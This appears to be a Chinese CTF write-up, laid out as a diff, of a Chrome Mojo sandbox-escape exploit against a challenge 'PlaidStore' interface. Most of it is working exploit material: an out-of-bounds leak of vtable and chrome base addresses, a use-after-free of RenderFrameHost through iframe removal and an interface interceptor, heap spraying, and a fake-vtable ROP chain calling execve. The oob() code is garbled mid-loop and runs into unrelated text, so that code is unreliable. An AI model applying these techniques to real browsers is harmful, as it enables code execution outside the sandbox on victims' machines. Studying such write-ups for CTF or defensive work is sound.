@@ -1,0 +1,195 @@
+    class __vector_base
+        pointer                                         __begin_;
+        pointer                                         __end_;
+        __compressed_pair __end_cap_;
+而此时我们的oob，也就是从vector的起始地址开始，可以越界读到后面的任意地址的值。
+    gdb-peda$ vmmap 0x00003268b2757ba0
+    Start              End                Perm  Name
+    0x00003268b237d000 0x00003268b287c000 rw-p  mapped
+    gdb-peda$ vmmap 0x00003268b2727f00
+    Start              End                Perm  Name
+    0x00003268b237d000 0x00003268b287c000 rw-p  mapped
+由于impl和vector在同一段上，其应该都是通过partitionAlloc动态分配出来的，所以我们可以大量分配impl，从而使impl和vector接近线性交替存放，并最终leak出来，这里我们的判断依据是虚表地址是页对齐的，也就是最后的0x7a0是不变的，从而找到虚表地址。  
+因为虚表地址在chrome的只读数据段中(.rodata)上，所以可以通过减去偏移找到chrome的基地址。  
+这个偏移的计算相当简单，我一般直接vmmap看一下加载基地址，然后减去即可找到偏移。
+    gdb-peda$ vmmap 0x55555f50a7a0
+    Start              End                Perm  Name
+    0x000055555f455000 0x000055555faf2000 r--p  /home/sakura/mojo/chrome
+    gdb-peda$ vmmap
+    Start              End                Perm  Name
+    0x000023612d770000 0x000023612d771000 ---p  mapped
+    0x000023612d771000 0x000023612dc70000 rw-p  mapped
+    0x0000555555554000 0x000055555824b000 r--p  /home/sakura/mojo/chrome
+    0x000055555824b000 0x000055555f455000 r-xp  /home/sakura/mojo/chrome
+    0x000055555f455000 0x000055555faf2000 r--p  /home/sakura/mojo/chrome
+    0x000055555faf2000 0x000055555fb4e000 rw-p  /home/sakura/mojo/chrome
+    ...
+    gdb-peda$ p/x 0x55555f50a7a0-0x0000555555554000
+    $1 = 0x9fb67a0
+    async function oob(){
+            console.log("oob");
+            var ps_list = [];
+            var try_size = 100;
+            var vt_addr = 0;
+            var render_frame_host_addr = 0;
+            var code_base = 0;
+            for(let i = 0; i  gadget.txt
+也可以这样，然后直接在文件里find需要的gadget，不再赘述。
+虚表其实就是保存着函数地址的表，虚函数调用的时候，首先根据保存的虚表地址(vtable
+entry)，找到虚函数表，然后再根据偏移在虚表里找到对应的函数地址。  
+所以只要改掉了其保存的函数地址，就可以在执行对应的虚函数时去执行任意代码。  
+我们来看一个正常的虚函数调用的汇编，这里我断在GetData，`getData("aaaa",
+0x100)`，虚函数调用也还是成员函数，所以第一个参数是this，也就是render_frame_host_的地址，然后key是"aaaa"，count是0x100。
+如图看寄存器，rdi是`0x88313358100`，rsi是"aaaa"，rdx是0x100，和我们刚刚的推论吻合。  
+再看汇编。
+    mov    rbx,rdi // rdi指向PlaidStoreImpl，是this
+    mov    rdi,QWORD PTR [rdi+0x8] //取其偏移0x8的位置的值，刚好就是render_frame_host，到rdi
+    mov    rax,QWORD PTR [rdi] //取render_frame_host_偏移0x0位置的值，也就是vtable entry到rax里
+    call   QWORD PTR [rax+0x160] //vtable entry指向虚表基地址vt_base_addr，call将跳转到vt_base_addr+0x160处保存的函数地址去执行。
+这里就是在call虚函数IsRenderFrameLive，这个函数的地址保存在[rax+0x160]，而由于前面所述的UAF的原因，render_frame_host_地址处的所有内容完全可控，所以rax的值我们完全可控。
+    void PlaidStoreImpl::GetData(
+        const std::string &key,
+        uint32_t count,
+        GetDataCallback callback) {
+      if (!render_frame_host_->IsRenderFrameLive()) { // use
+        std::move(callback).Run({});
+        return;
+      }
+chrome上比较常用的是劫持栈指针到我们可控的位置,这里`render_frame_host_`里的内容我们就完全可控，我们可以把栈指针劫持到`render_frame_host_`上。  
+让rax里保存的地址为`addr render_frame_host_+0x10`，这里就是新的虚表了。
+### UAF
+接下来的执行将分成两部分。
+  * 首先对于`#parent`
+    * 创建一个child iframe
+    * 然后通过MojoTest flag的特性，创建一个kPwnInterfaceName拦截器，并注册对应的处理函数
+    * 处理函数逻辑为
+      * 关闭拦截器
+      * 从接收到的MojoInterfaceRequestEvent里取出传过来的handle，用来初始化一个PlaidStorePtr指针plaid_store_ptr
+      * 返回这个指针给`#parent`
+    * 打开拦截器
+  * 对于`#child`
+    * 执行oob函数来leak出自己的render_frame_host_和chrome的基地址
+    * 创建Message pipe，将receiver端传给browser，用来bind到一个PlaidStoreImpl实例上
+    * 将remote端通过`Mojo.bindInterface(kPwnInterfaceName, pipe.handle0, "process");`发给拦截器，从而触发对应的处理函数。
+  * 这样即使child iframe被remove掉，remote端仍被parent持有，所以message pipe不会被中断，和其绑定的child iframe里对应的PlaidStoreImpl也不会被析构，但此时PlaidStoreImpl里保存的child iframe的`render_frame_host_`已经被析构掉了。
+  * 此时，通过`#parent`里保存的`plaid_store_ptr`，就可以从remote端调用browser里PlaidStoreImpl的函数，从而触发UAF，具体代码如下:
+    function allocateRFH(src) {
+        var iframe = document.createElement("iframe");
+        iframe.src = src;
+        document.body.appendChild(iframe);
+        return iframe;
+    }
+    function freeRFH(iframe) {
+        document.body.removeChild(iframe);
+    }
+    var kPwnInterfaceName = "pwn";
+    function sendPtr() {
+        var pipe = Mojo.createMessagePipe();
+        // bind the InstalledAppProvider with the child rfh
+        Mojo.bindInterface(blink.mojom.PlaidStore.name,
+            pipe.handle1, "context", true);
+        // pass the endpoint handle to the parent rfh
+        Mojo.bindInterface(kPwnInterfaceName, pipe.handle0, "process");
+    }
+    function getFreedPtr() {
+        return new Promise(function (resolve, reject) {
+            // create child iframe, allocate new RenderFrameHost
+            var frame = allocateRFH(window.location.href + "#child"); // designate the child by hash
+            // intercept bindInterface calls for this process to accept the handle from the child
+            let interceptor = new MojoInterfaceInterceptor(kPwnInterfaceName, "process");
+            interceptor.oninterfacerequest = function(e) {
+                // e is MojoInterfaceRequestEvent
+                interceptor.stop();
+                // bind the remote
+                var plaid_store_ptr = new blink.mojom.PlaidStorePtr(e.handle);
+                // get child iframe render_frame_host_addr
+                iframe_render_frame_host_addr = parseInt(window.frames[0].window.document.getElementById('render_frame_host_addr').innerText);
+                code_base = parseInt(window.frames[0].window.document.getElementById('code_base').innerText);
+                freeRFH(frame);
+                resolve(plaid_store_ptr);
+            }
+            interceptor.start();
+        });
+    }
+    async function trigger() {
+        // for #child
+        if (window.location.hash == "#child") {
+            await oob();
+            sendPtr();
+            return;
+        }
+        // for #parent
+        iframe_render_frame_host_addr = 0;
+        code_base = 0
+        var try_size = 100;
+        var kRenderFrameHost = 0xc28;
+        let ptr = await getFreedPtr();// free iframe
+    }
+剩下最后一个问题，如何通过heap
+spray来占坑我们之前释放掉的iframe里的`render_frame_host_`，其实很简单，因为chrome里heap
+management是使用TCMalloc的。  
+所以我们通过StoreData分配出来的`vector`和`render_frame_host_`是使用同样的分配器，也就是只要大量分配大小和`render_frame_host_`相等的vector就可能占位上。
+这里我们先看一下`render_frame_host_`的大小，步骤如下，最终找到大小是0xc28
+    gdb-peda$ info functions RenderFrameHostImpl::RenderFrameHostImpl
+    All functions matching regular expression "RenderFrameHostImpl::RenderFrameHostImpl":
+    Non-debugging symbols:
+    0x0000000003b21d80  content::RenderFrameHostImpl::RenderFrameHostImpl(content::SiteInstance*, scoped_refptr, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, int, bool)
+    0x0000000003b21d80  content::RenderFrameHostImpl::RenderFrameHostImpl(content::SiteInstance*, scoped_refptr, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, int, bool)
+    gdb-peda$ b content::RenderFrameHostImpl::RenderFrameHostImpl
+    Breakpoint 1 at 0x3b21d84
+    ...
+    gdb-peda$ r
+    Thread 1 "chrome" hit Breakpoint 1, 0x0000555559075d84 in content::RenderFrameHostImpl::RenderFrameHostImpl(content::SiteInstance*, scoped_refptr, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, int, bool) ()
+    gdb-peda$ bt
+    #0  0x0000555559075d84 in content::RenderFrameHostImpl::RenderFrameHostImpl(content::SiteInstance*, scoped_refptr, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, int, bool) ()
+    #1  0x0000555559075a96 in content::RenderFrameHostFactory::Create(content::SiteInstance*, scoped_refptr, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, int, bool) ()
+    ...
+    gdb-peda$ b content::RenderFrameHostFactory::Create
+    Breakpoint 2 at 0x5555590759e4
+    gdb-peda$ r // 重新运行
+    Thread 1 "chrome" hit Breakpoint 2, 0x00005555590759e4 in content::RenderFrameHostFactory::Create(content::SiteInstance*, scoped_refptr, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, int, bool) ()
+    ...
+    单步执行
+       0x555559075a52 :    mov    edi,0xc28 //可以看出大小是0xc28
+       0x555559075a57 :    call   0x55555ac584b0 
+       0x555559075a5c :    mov    rdi,rax
+       0x555559075a5f :    mov    rax,QWORD PTR [r14]
+       0x555559075a62 :    mov    QWORD PTR [rbp-0x38],rax
+       0x555559075a66 :    mov    QWORD PTR [r14],0x0
+       0x555559075a6d :    sub    rsp,0x8
+       0x555559075a71 :    movzx  eax,BYTE PTR [rbp+0x20]
+       0x555559075a75 :    lea    rdx,[rbp-0x38]
+       0x555559075a79 :    mov    r14,rdi
+       0x555559075a7c :    mov    rsi,rbx
+       0x555559075a7f :    mov    rcx,r13
+       0x555559075a82 :    mov    r8,r12
+       0x555559075a85 :    mov    r9,r15
+       0x555559075a88 :    push   rax
+       0x555559075a89 :    mov    eax,DWORD PTR [rbp+0x18]
+       0x555559075a8c :    push   rax
+       0x555559075a8d :    mov    eax,DWORD PTR [rbp+0x10]
+    => 0x555559075a90 :    push   rax
+       0x555559075a91 :    
+        call   0x555559075d80 
+    ...
+    ...
+    可以看出call的两个函数分别为new和RenderFrameHostImpl的构造函数
+    sakura@ubuntu:~/mojo$ c++filt _ZN7content19RenderFrameHostImplC2EPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib
+    content::RenderFrameHostImpl::RenderFrameHostImpl(content::SiteInstance*, scoped_refptr, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, int, bool)
+    sakura@ubuntu:~/mojo$ c++filt _ZnwmRKSt9nothrow_t
+    operator new(unsigned long, std::nothrow_t const&)
+我们可以直接拿之前获取的remote来调storeData，并在data里fake好gadaget和数据，还是刚刚的那个图。
+    var uaf_ab = new ArrayBuffer(kRenderFrameHost);
+    var uaf_ta = new BigUint64Array(uaf_ab);
+    uaf_ta[0] = BigInt(iframe_render_frame_host_addr)+0x10n;
+    uaf_ta[1] = 0n;
+    uaf_ta[2] = 0n; //use by pop rbp
+    uaf_ta[3] = BigInt(pop_rdi_ret);
+    uaf_ta[4] = BigInt(iframe_render_frame_host_addr)+0x10n+0x160n+8n;
+    uaf_ta[5] = BigInt(pop_rsi_ret);
+    uaf_ta[6] = BigInt(0);
+    uaf_ta[7] = BigInt(pop_rdx_ret);
+    uaf_ta[8] = BigInt(0);
+    uaf_ta[9] = BigInt(pop_rax_ret);
+    uaf_ta[10] = BigInt(59);
+    uaf_ta[11] = BigInt(syscall);
